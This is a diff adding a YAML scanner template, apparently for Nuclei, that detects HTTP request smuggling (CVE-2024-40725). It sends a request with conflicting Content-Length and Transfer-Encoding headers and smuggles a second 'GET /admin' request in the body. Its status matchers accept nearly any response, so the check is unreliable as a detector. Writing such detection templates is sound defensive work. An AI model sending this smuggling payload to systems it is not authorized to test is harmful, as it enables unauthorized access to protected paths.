@@ -1,0 +1,31 @@
+id: http-request-smuggling
+info:
+  name: HTTP Request Smuggling Detection
+  author: Betmen-N-Dgeng
+  severity: high
+  description: Detects HTTP Request Smuggling vulnerability by sending a smuggled request and checking for status code changes.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-40725
+  tags: http, smuggling, cve2024-40725
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Host: "{{Hostname}}"
+      Content-Length: "0"
+      Transfer-Encoding: "chunked"
+    body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {{Hostname}}\r\nUser-Agent: nuclei-smuggle-test\r\n\r\n"
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 404
+          - 500
+      - type: word
+        words:
+          - "HTTP/1.1 200"
+          - "HTTP/1.1 404"
+          - "HTTP/1.1 500"
+        part: response
